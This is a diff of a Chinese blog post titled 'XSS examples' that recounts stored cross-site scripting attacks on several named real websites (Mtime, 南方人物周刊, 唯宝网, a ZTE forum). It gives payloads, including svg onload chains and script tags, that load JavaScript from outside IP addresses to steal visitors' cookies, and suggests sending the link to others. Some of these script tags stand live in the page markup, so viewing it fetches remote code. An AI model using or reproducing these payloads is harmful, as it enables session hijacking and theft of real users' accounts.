@@ -21,6 +21,14 @@
   <title>xss实例 | liuqi</title>
   <meta name="author" content="春天的春，晴天的晴">
   
+  <meta name="description" content="时光网登录之后有一个我关注的话题然后
+
+并没有转换为实体编码，有xss漏洞在控制台测试函数$loadjs函数可以利用用$loadjs()函数构造payloadhttp://163.44.171.86/ssss.js
+svg/onload=”b=’http://’163”
+
+
+查看一下有没有转换没有转">
+  
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
@@ -166,7 +174,18 @@ alert("Please Update Your IE \n请升级您的IE浏览器");
     </header>
     <div class="entry depth">
       
-        
+        <p>时光网<br>登录之后<br>有一个我关注的话题然后<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%871.png?raw=true" alt="image"></p>
+<p><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%872.png?raw=true" alt="image"></p>
+<p><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%873.png?raw=true" alt="image"><br>并没有转换为实体编码，有xss漏洞<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%874.png?raw=true" alt="image"><br>在控制台测试函数$loadjs函数可以利用<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%875.png?raw=true" alt="image"><br>用$loadjs()函数构造payload<br><a href="http://163.44.171.86/ssss.js" target="_blank" rel="external">http://163.44.171.86/ssss.js</a></p>
+<p><a href="svg/onload=”b=’http://’163”">svg/onload=”b=’http://’163”</a></p>
+<p><svg onload="”b+=’.44.171.86’”"/></p>
+<p><svg onload="”b+=’/ssss.js’”"/></p>
+<p><svg onload="”$loadjs(b)”"><br/>查看一下有没有转换<br/><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%876.png?raw=true" alt="image"/><br/>没有转换为实体编码应该就可以了<br/>发链接给别人<br/>获取cookie<br/><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%877.png?raw=true" alt="image"/><br/>南方人物周刊xss实验报告<br/><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%878.png?raw=true" alt="image"/><br/>存在xss的点，每次加载都会弹出来<br/><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%879.png?raw=true" alt="image"/><br/>查看网页源代码，发现网页有两个地方触发了js<br/><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%8710.png?raw=true" alt="image"/><br/>一个是标题的地方<br/><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%8711.png?raw=true" alt="image"/><br/>一个是会员的姓名<br/>第二个对于我们来说是可以控制的，然后我们就可以利用构造payload<br/>缩短前的网址<a href="http://123.206.18.223/probe.js——&gt;缩短后的网址：http://t.im/16ar4" target="_blank" rel="external">http://123.206.18.223/probe.js——&gt;缩短后的网址：http://t.im/16ar4</a><br/>重新构造payload：payload：<script src="”http://t.im/16ar4”"><br>让网页加载外部服务器中构造的JS文件<br>发现有长度限制，还是不行</p>
+<p>唯宝网</p>
+<p>发现在写日记哪里存在xss<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%8712.png?raw=true" alt="image"><br>于是我换成获取饼干的js代码”/&gt;<script src='http://115.159.126.186/x.js'></script>  并在源码中插入有效成功</svg></p>
+<p>中兴论坛<br>发帖哪里存在xss<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%8713.png?raw=true" alt="image"><br>然后抓包<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%8714.png?raw=true" alt="image"><br>在我的444后面写上服务器的网址</p>
+<p><script src="http://163.44.171.86/ssss.js"></script><br>获取到cookie的信息<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%8715.png?raw=true" alt="image"></p>
+
       
     </div>
     <footer>
